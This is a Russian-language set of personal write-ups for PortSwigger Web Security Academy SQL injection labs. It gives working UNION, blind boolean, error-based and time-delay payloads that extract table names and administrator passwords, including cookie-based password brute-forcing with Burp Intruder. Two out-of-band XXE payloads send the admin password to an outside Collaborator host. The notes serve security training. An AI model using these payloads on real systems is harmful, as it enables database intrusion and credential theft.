Записи решений были не с самого начала

# ==SQL==

Задача: Атака методом SQL-инъекции, запрос типа и версии базы данных на MySQL и Microsoft (https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

В URL строку вставляем ```category=null'+UNION+SELECT+'1', '2' -- - ``` для определения столбцов и затем ```category=null'+UNION+SELECT+@@version, '2' -- -``` для определения версии


Задача: Атака с использованием SQL-инъекций, перечисление содержимого баз данных в базах данных, отличных от Oracle  (https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Снова узнаем количество столбцов (2) и получаем информацию о таблицах в БД ```null'+UNION+taSELECT+'1',table_name+FROM+information_schema.tables -- -```
Запрашиваем столбцы из таблицы users_zjyufi ```null'+UNION+SELECT+'1',column_name+FROM+information_schema.columns+WHERE+table_name='users_zjyufi' -- -```
Запрашиваем столбцы пароля и логина из таблицы ```null'+UNION+SELECT+password_zopjuj,username_kqwdov+FROM+users_zjyufi -- -```


Задача: Атака с помощью SQL-инъекции, вывод списка содержимого базы данных на Oracle (https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

null'+UNION+SELECT+'1','2'+FROM+dual -- -
null'+UNION+SELECT+table_name,NULL+FROM+all_tables--
null'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ZQNCEN'-- -
null'UNION+SELECT+PASSWORD_JLVNJQ,USERNAME_XQQPUF+FROM+USERS_ZQNCEN-- -

Задача:  SQL-инъекция UNION атака, определение количества столбцов, возвращаемых запросом (https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

null'+UNION+SELECT+NULL,NULL,NULL -- -

Задача: Атака UNION с помощью SQL-инъекции, нахождение столбца, содержащего текст(https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

null'+UNION+SELECT+NULL,NULL,NULL -- -
null'UNION+SELECT+NULL,'abc',NULL-- -
null'UNION+SELECT+NULL,'NbLytk',NULL-- -

Задача: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Аналогично задаче №2

Задача: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

null'+UNION+SELECT+'1',table_name+FROM+information_schema.tables -- -
null'+UNION+SELECT+'1',column_name+FROM+information_schema.columns+WHERE+table_name='users' -- -
null'+UNION+SELECT+'1',username|| '~' || password+FROM+users -- -  ('~' служит разделением вывода, можно использовать || один раз)

Задача: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

В бурпе изменим cookie  TrackingId=j6oKBZ3hNPucIvR3==' AND '1'='1== и увидим ответ "Welcome back". Если использовать ' AND '1'='2 то не увидим сообщение"Welcome back"
Проверим наличие таблицы users
```TrackingId=j6oKBZ3hNPucIvR3' AND (SELECT 'a' FROM users LIMIT 1)='a;```
Проверим наличие столбца администратор в таблице users  
```TrackingId=j6oKBZ3hNPucIvR3' AND (SELECT 'a' FROM users WHERE username='administrator')='a;```
Проверим длину пароля
```TrackingId=j6oKBZ3hNPucIvR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH (password)>19)='a;``` , >20 уже не верно, значит длина пароля 20 символов
Используя intruder начнем перебор пароля ( выделяем последний символ "a"). Настраиваем нагрузку a-z 0-9,добавляем настройку Grep-Match "Welcome back". Запускаем
```TrackingId=j6oKBZ3hNPucIvR3' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§```
После получения ответа в столбце"Welcome back" изменяем запрос (password,2,1) и повторяем пока не получим весь пароль (password,20,1)
zej8bk0uarsvl8ce8mhm

Задача: Blind SQL injection with conditional errors https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

Если при запросе получаем ошибку в ответе - значит запрос верный ( данные существуют)
1. Посетите главную страницу магазина и используйте Burp Suite для перехвата и изменения запроса, содержащего файл cookie. Для простоты предположим, что исходное значение файла cookie равно . `TrackingId``TrackingId=xyz`
2. Измените файл cookie, добавив к нему одну кавычку: `TrackingId`
    
    `TrackingId=xyz'`
    
    Убедитесь, что получено сообщение об ошибке.
    
3. Теперь измените его на две кавычки: Убедитесь, что ошибка исчезла. Это говорит о том, что синтаксическая ошибка (в данном случае незакрытая кавычка) оказывает заметное влияние на ответ.`TrackingId=xyz''`
4. Теперь вам нужно подтвердить, что сервер интерпретирует внедрение как SQL-запрос, т.е. что ошибка является синтаксической ошибкой SQL, а не любой другой типом ошибки. Для этого сначала нужно создать подзапрос, используя валидный синтаксис SQL. Попробуйте отправить:
    
    `TrackingId=xyz'||(SELECT '')||'`
    
    В этом случае обратите внимание, что запрос по-прежнему выглядит недействительным. Это может быть связано с типом базы данных - попробуйте указать в запросе предсказуемое имя таблицы:
    
    `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    Поскольку вы больше не получаете сообщение об ошибке, это указывает на то, что целевой объект, вероятно, использует базу данных Oracle, которая требует, чтобы во всех операторах явно указывалось имя таблицы. `SELECT`
    
5. Теперь, когда вы создали то, что кажется правильным запросом, попробуйте отправить неверный запрос, сохранив при этом действительный синтаксис SQL. Например, попробуйте запросить имя несуществующей таблицы:
    
    `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
    
    На этот раз возвращается ошибка. Такое поведение явно указывает на то, что внедрение обрабатывается серверной частью как SQL-запрос.
    
6. Если вы всегда внедряете синтаксически корректные SQL-запросы, вы можете использовать этот ответ об ошибке для вывода ключевой информации о базе данных. Например, чтобы убедиться в существовании таблицы, отправьте следующий запрос: `users`
    
    `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    Поскольку этот запрос не возвращает ошибку, можно сделать вывод, что эта таблица существует. Обратите внимание, что условие здесь важно, чтобы запрос не возвращал более одной строки, что нарушило бы нашу конкатенацию. `WHERE ROWNUM = 1`
    
7. Вы также можете использовать это поведение для тестирования условий. Сначала отправьте следующий запрос:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Убедитесь, что получено сообщение об ошибке.
    
8. Теперь измените его на:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Убедитесь, что ошибка исчезла. Это демонстрирует, что вы можете вызвать ошибку условно на основе истинности определенного условия. Оператор проверяет условие и вычисляет одно выражение, если условие истинно, и другое выражение, если условие ложно. Первое выражение содержит деление на ноль, что приводит к ошибке. В этом случае две полезные нагрузки проверяют условия и , и при условии . `CASE``1=1``1=2``true`
    
9. Это поведение можно использовать для проверки наличия определенных записей в таблице. Например, используйте следующий запрос, чтобы проверить, существует ли имя пользователя: `administrator`
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Убедитесь, что условие истинно (ошибка получена), подтвердив, что существует пользователь с именем . `administrator`
    
10. Следующим шагом является определение того, сколько символов в пароле пользователя. Для этого измените значение на: `administrator`
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Это условие должно выполняться, подтверждая, что длина пароля превышает 1 символ.
    
11. Отправка ряда последующих значений для проверки разной длины пароля. Отправить:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Затем отправите:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    И так далее. Вы можете сделать это вручную с помощью [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), так как длина, скорее всего, будет короткой. Когда условие перестает быть истинным (т.е. когда ошибка исчезает), вы определили длину пароля, которая на самом деле составляет 20 символов.
    
12. После определения длины пароля следующим шагом будет проверка символа в каждой позиции, чтобы определить его значение. Это предполагает гораздо большее количество запросов, поэтому нужно использовать [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Отправьте запрос, над которым вы работаете, в Burp Intruder, используя контекстное меню.
13. Перейдите в Burp Intruder и измените значение файла cookie на:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    При этом функция извлекает один символ из пароля и проверяет его на соответствие определенному значению. Наша атака будет циклически перебирать каждую позицию и возможное значение, проверяя каждую из них по очереди. `SUBSTR()`
    
14. Поместите маркеры положения полезной нагрузки вокруг последнего символа в значении cookie. Для этого выберите только кнопку и нажмите кнопку Кнопка "Добавить §". После этого вы должны увидеть следующее значение cookie (обратите внимание на маркеры положения полезной нагрузки): `a``a`
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. Чтобы протестировать персонажа в каждой позиции, вам нужно отправить подходящие полезные нагрузки в определенную позицию полезной нагрузки. Можно предположить, что пароль содержит только строчные буквенно-цифровые символы. На боковой панели "Полезная нагрузка" проверьте, что выбран "Простой список", а в разделе "Конфигурация полезной нагрузки" добавьте полезную нагрузку в диапазоне a - z и 0 - 9. Вы можете легко выбрать их с помощью раскрывающегося списка «Добавить из списка».
16. Запустите атаку, нажав кнопку "Начать атаку".
17. Просмотрите результаты атаки, чтобы найти значение символа на первой позиции. При возникновении ошибки приложение возвращает код состояния HTTP 500 и обычный код состояния HTTP 200. В столбце «Статус» в результатах поиска злоумышленника отображается код статуса HTTP, поэтому вы можете легко найти строку с 500 в этом столбце. Полезная нагрузка, отображаемая для этой строки, является значением символа в первой позиции.
18. Теперь вам просто нужно повторно запустить атаку для каждой из остальных позиций символов в пароле, чтобы определить их значение. Для этого вернитесь на исходную вкладку Intruder, и измените указанное смещение с 1 на 2. После этого вы должны увидеть следующее значение в качестве файла cookie:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
1. Запустите модифицированную атаку, просмотрите результаты и обратите внимание на персонажа на втором смещении.
2. Продолжайте этот процесс, проверяя смещение 3, 4 и так далее, пока не получите полный пароль
45bnqyzfthqk4y291bkc

Задача: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

Отправим пробный запрос
```TrackingId=lhbEh21yExjqWcDf''' ``` и увидим ошибку
```Unterminated string literal started at position 54 in SQL SELECT * FROM tracking WHERE id = 'lhbEh21yExjqWcDf''''. Expected  char ```
Судя по ошибке,нам нужно добавлять комментарий в конце. ```TrackingId=lhbEh21yExjqWcDf''' -- ``` не выдает ошибку
С помощью CAST (преобразование одного типа данных в другой) мы можем получить ошибку и сделать SQL видимой
 ```TrackingId=lhbEh21yExjqWcDf'AND CAST ((SELECT 1) AS int) --  ```
 Выдает ошибку связанную с типом данных
 ```TrackingId=lhbEh21yExjqWcDf'AND 1=CAST ((SELECT 1) AS int)-- ``` ошибке нет, значит нашли верный запрос
```TrackingId=lhbEh21yExjqWcDf'AND 1=CAST ((SELECT username FROM users) AS int)--``` выдает ошибку и обрезает часть запроса. Удалим лишнее
```Cookie: TrackingId='AND 1=CAST ((SELECT username FROM users) AS int) -- ```  выдает другую ошибку связанную с кол-вом строк
```Cookie: TrackingId='AND 1=CAST ((SELECT username FROM users LIMIT 1) AS int) -- ``` выдает ошибку в которой видим пользователя administrator
```'AND 1=CAST ((SELECT password FROM users LIMIT 1) AS int) --``` выдает ошибку в которой видим пароль администора

Задача: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

Вставить в куки ' || pg_sleep(10)-- (так как это постгря PostgreSQL)
'; IF (1=2) WAITFOR DELAY '0:0:10'-- (другой вариант для других БД)

Задача: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

 Для этого перейдите на  **вкладку Пул ресурсов**, чтобы открыть боковую панель **Пул ресурсов** и добавить атаку в пул ресурсов с параметром **Максимум одновременных запросов**

mcup6zazvukgqr23uwij

Задача: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

```'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f<!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+"http%3a//c7kb241mbka355xndhrfe0l0lrrifc31.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--```


Задача: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
```'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[ <!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.fxges7rp1n06v8nq3khi43b3buhl5gt5.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=JyMoujxIe1e2qhTiPPSl0qyFI7Xm77h5```

задача: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

